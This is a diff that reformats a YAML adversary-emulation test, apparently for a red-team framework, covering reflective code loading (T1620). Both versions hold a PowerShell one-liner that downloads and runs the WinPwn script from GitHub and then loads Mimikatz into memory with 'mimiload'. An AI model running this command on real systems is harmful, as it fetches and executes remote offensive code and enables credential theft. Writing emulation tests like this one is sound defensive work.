@@ -1,13 +1,15 @@
-- id: f1415c83-47cb-54d8-9a97-4506f0d2ac29
+- requirements: []
   name: Soumaia ART Tests - WinPwn - Reflectively load Mimik@tz into memory
   description: Reflectively load Mimik@tz into memory technique via function of WinPwn
   tactic: stealth
-  technique:
-    attack_id: T1620
-    name: Reflective Code Loading
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-          mimiload -consoleoutput -noninteractive
+  technique_id: T1620
+  technique_name: Reflective Code Loading
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive
+  id: f1415c83-47cb-54d8-9a97-4506f0d2ac29
